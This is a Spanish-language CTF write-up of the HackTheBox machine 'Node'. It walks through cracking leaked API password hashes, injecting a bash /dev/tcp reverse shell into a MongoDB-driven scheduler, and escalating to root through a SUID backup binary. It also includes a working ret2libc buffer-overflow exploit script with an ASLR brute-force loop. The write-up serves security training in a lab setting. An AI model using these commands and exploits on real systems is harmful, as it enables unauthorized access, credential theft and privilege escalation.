---
layout: post
render_with_liquid: false
title: "HTB Writeup: Node"
date: 2026-05-28
category: writeups
tags: [htb, linux, medium, nodejs, express, mongodb, sha256, hash-cracking, zip-cracking, buffer-overflow, ret2libc, aslr-bruteforce, suid, nosql]
platform: HackTheBox
os: Linux
difficulty: Medium
has_exploits: true
exploits_url: /writeups/node/exploit/
resumen: "Aplicación Express 'MyPlace' que filtra hashes SHA-256 sin sal vía API /api/users; crackeo con john (manchester/spongebob/snowflake), login como admin y descarga de un backup base64+ZIP con password 'magicword' que contiene el código de la app y las credenciales de Mongo del usuario mark. SSH como mark, abuso de un scheduler en Node.js que ejecuta como tom comandos insertados en una colección Mongo. Privesc final tom→root vía un binario SUID 'backup' que comprime con magicword una ruta arbitraria — quick win contra /root — y, como ejercicio, ret2libc real (NX + ASLR por fuerza bruta en 32 bits) explotando un buffer overflow en su tercer argumento."
permalink: /writeups/node/
---

| Propiedad  | Valor      |
| :--------- | :--------- |
| Plataforma | HackTheBox |
| OS         | Linux      |
| Dificultad | Medium     |
| Autor      | Ghostvyle  |

### Temas Tratados

- **Recon:** Nmap, Burpsuite para descubrir endpoints API
- **Hash cracking:** SHA-256 sin salt con `john` (rockyou)
- **Consulta de API:** exposición de hashes en `/api/users`
- **Backup interno:** base64 + ZIP con password crackeable, código fuente con creds de Mongo
- **Pivoting:** scheduler en Node.js ejecutando `cmd` de una colección Mongo
- **Privesc tom → root:** SUID `backup` con magic word — abuso de la funcionalidad legítima para robar `/root`
- **Privesc tom → root (extra):** explotación real de **buffer overflow** del binario via **ret2libc** con **NX + ASLR** (fuerza bruta en 32 bits)

## Sinopsis

**Node** es una máquina Linux centrada en una aplicación Express ("MyPlace") con MongoDB detrás. El primer punto débil está en su **API REST**: el endpoint `/api/users` devuelve **todos los usuarios** del sistema con sus hashes **SHA-256 sin salt** y el flag. Mediante `john` obtenemos credenciales para el panel admin, donde se ofrece un *Download Backup* que entrega un blob **base64** → tras decodificar es un **ZIP protegido con contraseña** (también débil → `magicword`). Dentro está el código de la app y, en `app.js`, las credenciales de Mongo del usuario **mark** — que resultan reutilizables para SSH.

Una vez como `mark` en el host, descubrimos un proceso de **tom** ejecutando `/usr/bin/node /var/scheduler/app.js`. Ese scheduler se conecta a la BD `scheduler` y ejecuta — **como tom** — el campo `cmd` de cada documento que insertemos en `db.tasks`. Insertamos una reverse shell y pivotamos a `tom`.

La escalada final se puede hacer mediante 2 vías:

- **Camino corto** (el que da el flag): el binario **`/usr/local/bin/backup`** es SUID root, accesible por el grupo `admin` (al que pertenece `tom`). `ltrace` revela que internamente comprime con `/usr/bin/zip -r -P magicword <out> <dir>` cualquier ruta que le pasemos, una vez le damos uno de los tokens válidos guardados en `/etc/myplace/keys`. Apuntándolo a `root` desde la raíz (/root está en una blacklist) obtenemos un ZIP de root con password conocida → `root.txt`.
- **Camino largo:** el mismo binario tiene un **buffer overflow** en el tercer argumento; ~512 bytes sobrescriben EIP. Con **NX** activo no podemos meter shellcode en pila, así que montamos un **ret2libc** clásico — `EIP = system; ret = exit; arg = "/bin/sh"`. Con **ASLR completo** (`/proc/sys/kernel/randomize_va_space = 2`), pero en 32 bits la base de libc colisiona con suficiente frecuencia como para acertarla **por fuerza bruta** en un `while true; do … done`.

---

## Reconocimiento

### Escaneo de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.7.60 -oG allPorts
```

![Descubrimiento de puertos con nmap](/writeups/node/assets/01_nmap_all_ports.png)

Dos puertos: **22** y **3000**.

```bash
nmap -sCV -p22,3000 10.129.7.60 -oN targeted
```

![Detección de servicio y versión con nmap -sCV](/writeups/node/assets/02_nmap_service_version.png)

| Puerto   | Servicio | Versión                                |
| :------- | :------- | :------------------------------------- |
| 22/tcp   | SSH      | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2        |
| 3000/tcp | HTTP     | Express (`X-Powered-By: Express`)      |



### MyPlace

![Landing de MyPlace con miembros tom / mark / rastating](/writeups/node/assets/03_myplace_homepage.png)

![whatweb confirma Express](/writeups/node/assets/04_whatweb_express.png)

Home presenta tres usuarios — `tom`, `mark`, `rastating` — y un botón **LOGIN**. Un primer `wfuzz` con `directory-list-2.3-medium` filtrando por número de líneas devuelve apenas tres directorios estáticos (`/uploads`, `/assets`, `/vendor`):

```bash
wfuzz -c --hl=90 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.7.60:3000/FUZZ
```

![wfuzz baseline — pocas rutas útiles](/writeups/node/assets/05_wfuzz.png)

El tráfico real lo descubrimos navegando con Burpsuite, donde destaca **`/api/users/latest`**.

![Burp HTTP history — aparece /api/users/latest](/writeups/node/assets/06_burp_api_users_latest.png)

---

## Filtrado de hashes por la API + crackeo

`/api/users/latest` devuelve solo el último, pero **`/api/users`** (sin sufijo) devuelve **todos** — con `username`, `password` (SHA-256 hex) y `is_admin`:

```
http://10.129.7.60:3000/api/users
```

![/api/users dump con hashes y is_admin=true para el admin](/writeups/node/assets/07_api_users_hashes.png)

```
myP14ceAdm1nAcc0uNT  :  dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af  is_admin=true
tom                   :  f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
mark                  :  de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
rastating             :  5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
```

Son **SHA-256 sin sal**. `john` (con `--format=raw-SHA256`) los rompe instantáneamente contra `rockyou`:

```bash
echo "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af" > admin_passwd.txt
john --wordlist=/usr/share/wordlists/rockyou.txt admin_passwd.txt --format=raw-SHA256
```

![john cracks the admin hash → manchester](/writeups/node/assets/08_john_admin.png)

Repitiendo para `tom` y `mark`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt tom_passwd.txt  --format=raw-SHA256   # spongebob
john --wordlist=/usr/share/wordlists/rockyou.txt mark_passwd.txt --format=raw-SHA256   # snowflake
```

![john cracks tom → spongebob](/writeups/node/assets/09_john_tom.png)

![john cracks mark → snowflake](/writeups/node/assets/10_john_mark.png)

Credenciales recuperadas:

| Usuario              | SHA-256 cracked |
| :------------------- | :-------------- |
| myP14ceAdm1nAcc0uNT  | `manchester`    |
| tom                  | `spongebob`     |
| mark                 | `snowflake`     |


---

## Login admin → descarga del backup

Con `myP14ceAdm1nAcc0uNT:manchester` entramos al panel `/admin`, que añade un botón **Download Backup**:

![Panel admin con Download Backup](/writeups/node/assets/11_admin_panel_backup.png)

```bash
# myplace.backup ya descargado
base64 -d myplace.backup | sponge myplace_decode
file myplace_decode
# Zip archive data, made by v3.0 UNIX, last modified Aug 16 2022 ...
```

![cat + base64 -d + sponge — el blob es un ZIP](/writeups/node/assets/12_base64_decode_zip.png)

Al intentar abrir el ZIP nos pide contraseña:

```bash
7z x myplace_decode
# Enter password (will not be echoed):
```

![7z pide password](/writeups/node/assets/13_7z_password_prompt.png)

Lo extraemos para john y crackeamos:

```bash
zip2john myplace_decode > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
# magicword (myplace_decode)
```

![john rompe la contraseña del ZIP → magicword](/writeups/node/assets/14_john_zip_magicword.png)

Con `magicword` extraemos el contenido — es el **código fuente** completo de la app desde `/var/www/myplace`:

```bash
7z x myplace_decode -pmagicword
ls -la
# node_modules/  static/  app.html  app.js  package-lock.json  package.json
```

![ls -la del backup extraído: el código fuente de la app](/writeups/node/assets/15_backup_extracted.png)

En **`app.js`** está la cadena de conexión a Mongo que la app usa para auth. La string contiene las credenciales del usuario `mark`:

```
mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace
```

Las probamos directamente en SSH — y funcionan.

---

## SSH como mark

```bash
ssh mark@10.129.7.60          # 5AYRft73VtFpc84k
```

![ssh mark — banner Ubuntu y prompt mark@node](/writeups/node/assets/16_ssh_mark_banner.png)

`node` es Ubuntu 16.04. Estamos dentro.

---

## Mark → tom vía scheduler + Mongo

Buscamos procesos privilegiados y aparece uno claro:

```bash
ps -faux
```

![ps muestra a tom corriendo /usr/bin/node /var/scheduler/app.js](/writeups/node/assets/17_ps_aux_tom_scheduler.png)

El usuario **tom** ejecuta un servicio Node.js en `/var/scheduler/app.js`. Leemos el código fuente:

```bash
cat /var/scheduler/app.js
```

![Código del scheduler que ejecuta el campo cmd como tom](/writeups/node/assets/18_scheduler_appjs_source.png)

La lógica clave:

```js
MongoClient.connect("mongodb://mark:5AYRft73VtFpc84k@localhost:27017/" +
                    "?authMechanism=DEFAULT&authSource=scheduler",
  function(err, db) {
    setInterval(function() {
      db.collection('tasks').find().toArray(function(error, docs) {
        if (!error && docs) {
          docs.forEach(function(doc) {
            if (doc) {
              exec(doc.cmd);
              db.collection('tasks').deleteOne({_id: doc._id});
            }
          });
        }
      });
    }, 30000);
  });
```

Cada 30 segundos el scheduler:

1. lee la colección `tasks` de la BD `scheduler`,
2. ejecuta `doc.cmd` con `child_process.exec` (es decir, **como `tom`**),
3. borra el documento.

```bash
mongo localhost:27017/scheduler -u mark -p '5AYRft73VtFpc84k' --authenticationDatabase scheduler
> use scheduler
```

![mongo scheduler login + use scheduler](/writeups/node/assets/19_mongo_scheduler_login.png)

Insertamos una reverse shell en `tasks`:

```js
> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.70/7777 0>&1'"})
WriteResult({ "nInserted" : 1 })
```

![db.tasks.insert de la reverse shell](/writeups/node/assets/20_db_tasks_insert_revshell.png)

Y a esperar a que el `setInterval` la dispare. A los pocos segundos:

```bash
nc -lvnp 7777
```

![nc cae como tom@node](/writeups/node/assets/21_nc_tom_shell.png)

Somos **tom**. La flag de usuario está en su home:

```bash
cat ~/user.txt
# 3dc9f0f20cd3a6953422c468806a7640
```

![cat user.txt como tom](/writeups/node/assets/22_user_flag.png)

---

## Tom → root — superficie SUID

Enumeramos binarios SUID como `tom`:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![SUID list — /usr/local/bin/backup destaca](/writeups/node/assets/23_tom_suid_find.png)

```bash
ls -la /usr/local/bin/backup
id
```

![backup es SUID root, grupo admin; tom pertenece al grupo admin](/writeups/node/assets/24_backup_perms_admin_group.png)

- `/usr/local/bin/backup`: **`-rwsr-xr-- root admin`** — SUID **root**, grupo **admin**, ejecutable solo por root y por miembros del grupo `admin`.
- `id` de tom: `groups=...,1002(admin)`. **Tom puede ejecutarlo.**

El binario es un ELF de **32 bits**:

```
setuid ELF 32-bit LSB executable, Intel 80386, ... interpreter /lib/ld-linux.so.2, not stripped
```

### Comportamiento — qué hace exactamente

Al ejecutarlo sin los argumentos correctos pinta una marquesina ASCII y se queja:

![Mensaje de "magic word" sin argumentos](/writeups/node/assets/25_backup_magic_word.png)

```
[!] Ah-ah-ah! You didn't say the magic word!
```

`ltrace`:

```bash
ltrace backup
```

![ltrace: __libc_start_main → geteuid → setuid(...)](/writeups/node/assets/26_ltrace_setuid.png)

```
geteuid()  = 0
setuid(0)  = 0
```

El binario **mantiene los privilegios** del SUID al inicio (a diferencia de la traza de arriba, donde `ltrace` desactiva el SUID y geteuid devuelve `1000`; en ejecución real, `geteuid()=0` y `setuid(0)` lo hace permanente). Es la confirmación de que cualquier `system()` o `exec()` que ejecute después corre como root.

### Las keys

Los tokens viven en `/etc/myplace/keys` y `tom` puede leerlos:

```bash
cat /etc/myplace/keys
```

![Tres tokens hex en /etc/myplace/keys](/writeups/node/assets/27_etc_myplace_keys.png)

```
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

Cualquiera de los tres es válida para que el binario se ejecute correctamente.

### Cómo funciona el backup por dentro

`strace` da muy poca información: solo muestra syscalls del kernel (`open`, `mmap`, `brk`…) — no las llamadas a funciones de libc, que es donde está toda la lógica del binario.

```bash
strace backup
```

![strace solo muestra syscalls — no nos sirve](/writeups/node/assets/43_strace_not_enough.png)

Con `ltrace` (library calls) sí. Pasamos un token válido como segundo argumento y un directorio `/tmp` como tercero:

```bash
ltrace backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /tmp
```

Lo primero que hace el binario es validar el parámtro -q (aun que no lo hace muy bien, ya que con poner cualquier cosa es suficiente). Luegop valida la key, carga las tres líneas de `/etc/myplace/keys` y compara nuestro segundo argumento contra cada una con `strncmp`:

![Validación con strncmp contra cada línea de /etc/myplace/keys](/writeups/node/assets/44_ltrace_key_strncmp.png)


Es decir, el binario:

1. Genera un nombre aleatorio `/tmp/.backup_<rand>`.
2. Llama a `zip -r -P magicword` para comprimir **el directorio que le pasemos como tercer argumento**, con la contraseña hardcodeada **`magicword`**.
3. Vuelca el resultado en base64 a stdout.

El ltrace completo enseña otra cosa importante: antes del `zip`, el binario compara el path con una **blacklist** y rechaza algunas rutas conocidas. Una de ellas es `/root`:

![ltrace completo — flujo end-to-end con un path no blacklisteado](/writeups/node/assets/45_ltrace_full_tmp.png)

El binario **no valida que el directorio destino sea un destino legítimo** — solo que no esté en una lista negra muy concreta. Y se ejecuta como root. Eso es todo lo que necesitamos.

Mediante pspy vemos como lleva a cabo el backup.

![ltrace: zip -r -P magicword + base64 -w0](/writeups/node/assets/28_ltrace_zip_magicword.png)

```
sh -c '/usr/bin/zip -r -P magicword /tmp/.backup_964881500 /tmp > /dev/null'
sh -c '/usr/bin/base64 -w0 /tmp/.backup_964881500'
```

---

## Privesc tom → root — camino corto

`backup` comprime cualquier ruta no blacklisteada como root con contraseña conocida. Si pasamos `/root` literal, lo rechaza. Pero si cambiamos al directorio raíz y damos la ruta **relativa**:

```bash
cd /
backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 root | base64 -d > /tmp/root.zip
```

La comparación `strncmp("root", "/root", …)` falla, el binario tira para adelante y nos zipea `/root` con `magicword`.

Lo transferimos a Kali y lo abrimos:

```bash
7z x root.zip          # password: magicword
```

![7z extrae root.zip con magicword](/writeups/node/assets/29_7z_extract_rootzip.png)

```bash
cd root && cat root.txt
# be642b00391b940eddc671a4745160c8
```

![root.txt obtenido directamente del backup](/writeups/node/assets/30_root_flag_via_backup.png)

---

## Privesc tom → root — camino largo (ret2libc)

Durante el `ltrace` ya nos llamó la atención que pasar mucha basura como tercer argumento revienta el binario:

```bash
ltrace backup -q a01a6aa5...c508 $(perl -e 'print "A"x800')
# ...
# --- SIGSEGV (Segmentation fault) ---
# +++ killed by SIGSEGV +++
```

![ltrace terminando con SIGSEGV — el binario revienta con muchas A's en el 3er argumento](/writeups/node/assets/46_segfault_victim.png)

El binario está copiando el tercer argumento a un buffer en pila con una función sin control de longitud (`strcpy`, `sprintf`…). 

Para analizar tranquilos nos llevamos a Kali el binario:

```bash
# víctima
nc -q1 10.10.14.70 4444 < /usr/local/bin/backup
nc -q1 10.10.14.70 4444 < /lib32/libc.so.6
# en Kali, recibiendo con: nc -lvnp 4444 > backup
chmod +x backup
./backup a a a
```

![backup corriendo en local — confirma el binario funcional](/writeups/node/assets/47_backup_local.png)

Reproducimos el crash con Python:

```bash
./backup -q a01a6aa5...c508 $(python3 -c 'print("A"*7000)')
# zsh: segmentation fault
```

![Mismo segfault en Kali con 7000 A's](/writeups/node/assets/48_segfault_local_7000.png)

### Bajo GDB + GEF

```bash
gdb ./backup
gef> run -q a01a6aa5...c508 $(python3 -c 'print("A"*7000)')
```

![Volcado de registros: EIP y EBP llenos de A's](/writeups/node/assets/49_gdb_registers_AAAA.png)

`EIP = 0x41414141`, `EBP = 0x41414141`. EBP machacado es esperable. EIP es lo que importa: cuando la función ejecuta `ret`, salta a donde apunte EIP — y EIP es nuestro.

![gdb: SIGSEGV con EIP = 0x41414141 — control total del flujo](/writeups/node/assets/31_gdb_eip_AAAA.png)

### Protecciones

```bash
gef> checksec
```

![checksec: NX activado, sin canary, sin PIE, RelRO parcial](/writeups/node/assets/32_checksec.png)

```
Canary : ✘     NX : ✓     PIE : ✘     Fortify : ✘     RelRO : Partial
```

Tres cosas:

- **No canary**: no hay valor centinela entre el buffer y el saved EIP que detecte el desbordamiento. Si lo hubiera, la función abortaría con `*** stack smashing detected ***` antes de devolver.
- **No PIE**: el binario carga siempre en la misma base. Las direcciones internas (`main`, secciones `.text`, `.bss`, GOT/PLT) son fijas y conocidas. No es lo que nos hace falta para ret2libc, pero ayuda si necesitásemos gadgets propios.
- **NX ✓**: la pila es no ejecutable. Aunque escribamos shellcode en el buffer y EIP apunte al inicio del shellcode, al ejecutar la primera instrucción saltará una excepción. **Por eso no podemos meter shellcode en pila** — y por eso pasamos a **ret2libc**.

> **Ret2libc**: no metemos código nuestro; **reutilizamos** funciones de `libc` que ya están mapeadas en el proceso. Hacemos que EIP apunte a `system()` y dejamos en la pila — donde `system` espera su argumento — la dirección de la cadena `"/bin/sh"` que `libc` ya trae dentro. El resultado es `system("/bin/sh")` ejecutado por el propio proceso, que sigue siendo SUID root.

### ASLR

```bash
tom@node:~$ ldd /usr/local/bin/backup
        libc.so.6 => /lib32/libc.so.6 (0xf756c000)
tom@node:~$ ldd /usr/local/bin/backup
        libc.so.6 => /lib32/libc.so.6 (0xf7574000)
```

![ldd dos veces: la base de libc cambia](/writeups/node/assets/33_ldd_aslr.png)

```bash
cat /proc/sys/kernel/randomize_va_space   # 2
```

![/proc/sys/kernel/randomize_va_space = 2 — ASLR completo](/writeups/node/assets/34_randomize_va_space.png)

ASLR activo: la base de libc cambia cada vez. **Pero en 32 bits el espacio se queda corto**. Si lanzamos el exploit en bucle, en pocos cientos de iteraciones acertamos.

> **Si fuera 64 bits**: el espacio efectivo serían 28-30 bits → unos cientos de millones de bases. El brute force directo deja de ser viable y haría falta filtrar primero un info-leak.

### Offset hasta EIP

Generamos un patrón cíclico de 1000 bytes con GEF, lo metemos como tercer argumento, miramos qué cuatro bytes acaban en EIP y le preguntamos a GEF a qué offset corresponden:

```
gef> pattern create 1000
[+] Saved as '$_gef1'
```

![GEF: patrón cíclico de 1000 bytes](/writeups/node/assets/35_pattern_create.png)

```
gef> pattern offset $eip
[+] Found at offset 512 (little-endian search)
```

![pattern offset $eip → 512 bytes hasta EIP](/writeups/node/assets/36_pattern_offset_512.png)

Lo verificamos rellenando 512 As + 4 Bs y mirando el valor exacto que cae en EIP:

```
gef> run -q a01a6aa5...c508 $(python3 -c 'print("A"*512 + "B"*4)')
```

![EIP = 0x42424242: los 4 Bs caen justo después de los 512 As](/writeups/node/assets/50_eip_BBBB_offset_confirm.png)

`EIP = 0x42424242`. Si el offset fuera 511 o 513 saldría desalineado (`0x42424141`, `0x41424242`…). **Justos 512**.

### Direcciones en libc

Ret2libc necesita tres cosas dentro de `libc`:

- `system` — al `ret` saltamos aquí
- `exit` — cierre limpio cuando `system` termine
- la cadena `"/bin/sh"` — argumento de `system`

Las dos primeras vienen de la tabla de símbolos; la tercera, de la sección `.rodata`. Ambas son posiciones **fijas relativas a la base de libc**, así que basta con extraerlas della librería:

```bash
readelf -s /lib32/libc.so.6 | grep -E " system@@| exit@@"
```

![readelf -s libc filtrado por system y exit](/writeups/node/assets/37_readelf_libc_symbols.png)

```bash
strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
```

![strings -a -t x → /bin/sh @ offset 0x15900b](/writeups/node/assets/38_strings_binsh.png)

| Símbolo     | Offset relativo a la base de libc |
| :---------- | :-------------------------------- |
| `system`    | `0x0003a940`                      |
| `exit`      | `0x0002e7b0`                      |
| `"/bin/sh"` | `0x0015900b`                      |

### Eligiendo una base "objetivo"

Cualquier base que veamos al hacer `ldd backup` en la víctima es una base **válida** que el ASLR genera. La estrategia es fijar una de esas como objetivo y enviar el exploit en bucle hasta que el ASLR vuelva a colocar libc ahí:

```bash
tom@node:/tmp$ ldd /usr/local/bin/backup
        libc.so.6 => /lib32/libc.so.6 (0xf7557000)
```

![ldd en la víctima — usamos una de estas bases como objetivo](/writeups/node/assets/51_ldd_victim_base.png)

Para el exploit fijamos `0xf757c000` como base objetivo.

### El payload

`exploit.py` empaqueta `512 As + system + exit + &"/bin/sh"` en little-endian y lo imprime para que el shell se lo pase como tercer argumento al binario:

```python
from struct import pack

offset = 512
junk = "A" * offset

# ret2libc -> EIP -> system_addr + exit_addr + bin_sh_addr => system("/bin/sh") [Libc]
libc_base_addr = 0xf757c000      # base objetivo — el ASLR la moverá; nosotros acertaremos a fuerza de iteraciones

system_addr_off = 0x0003a940
exit_addr_off   = 0x0002e7b0
bin_sh_addr_off = 0x0015900b

system_addr = pack("<I", libc_base_addr + system_addr_off)
exit_addr   = pack("<I", libc_base_addr + exit_addr_off)
bin_sh_addr = pack("<I", libc_base_addr + bin_sh_addr_off)

payload = junk + system_addr + exit_addr + bin_sh_addr
print(payload)
```

![exploit.py — generador del payload ret2libc](/writeups/node/assets/39_exploit_py.png)

¿Por qué `exit_addr` va **en medio** y no al final? Porque en 32 bits los argumentos de las funciones se pasan por pila, y cuando `system` empieza a ejecutarse cree que está en una llamada normal: lo primero que hay encima de la pila es a dónde tiene que volver al terminar, y lo siguiente son sus argumentos. Si dejamos `bin_sh_addr` justo después de `system_addr`, `system` lo cogería como dirección de retorno (intentaría "volver" a `/bin/sh`) y nunca lo usaría de argumento.

Por eso metemos `exit_addr` entre los dos: ese hueco es el "a dónde vuelvo cuando acabe" que `system` espera, y `bin_sh_addr` queda justo donde tiene que estar para que `system` lo lea como su primer argumento. Apuntamos ese retorno a `exit()` para que, al cerrar la shell, el proceso muera limpio en lugar de saltar a basura y segfaultear (el segfault no nos quita el shell, pero ensucia la salida).

Imprimimos el payload para ver que son bytes en crudo (no la representación):

```bash
python exploit.py
```

![Los bytes del payload por stdout](/writeups/node/assets/52_python_exploit_bytes.png)

### Una iteración

Probamos una invocación contra el binario en la víctima:

```bash
backup abdc a01a6aa5...c508 $(python exploit.py)
```

![Una sola ejecución del exploit](/writeups/node/assets/53_single_exploit_invocation.png)

La inmensa mayoría de las no funciona — porque el ASLR puso libc en otra base distinta a `0xf757c000` y `system` no está donde le decimos. Solo hay que repetir.

### Fuerza bruta del ASLR

```bash
while true; do
  backup abdc a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python exploit.py)
done
```

![Bucle de fuerza bruta sobre el ASLR](/writeups/node/assets/40_bruteforce_loop.png)

Tras un puñado de iteraciones, una cae con la base "buena". El binario imprime `Validated access token` y `Starting archiving …` — y en lugar de sproducir un segmentation fault, abre la sesión `system("/bin/sh")` que pedimos:

![La iteración en la que el ASLR coincide con nuestra base objetivo](/writeups/node/assets/41_aslr_hit_archiving.png)

A partir de ese punto el shell es **root**. Confirmamos la flag por segunda vez:

```bash
cd /root
cat root.txt
# be642b00391b940eddc671a4745160c8
```

![cat root.txt como root — misma flag, esta vez con shell completa](/writeups/node/assets/42_root_flag_ret2libc.png)

---

> **Disclaimer**: Este contenido es exclusivamente para investigación y formación en ciberseguridad. Solo debe aplicarse en entornos autorizados y controlados.
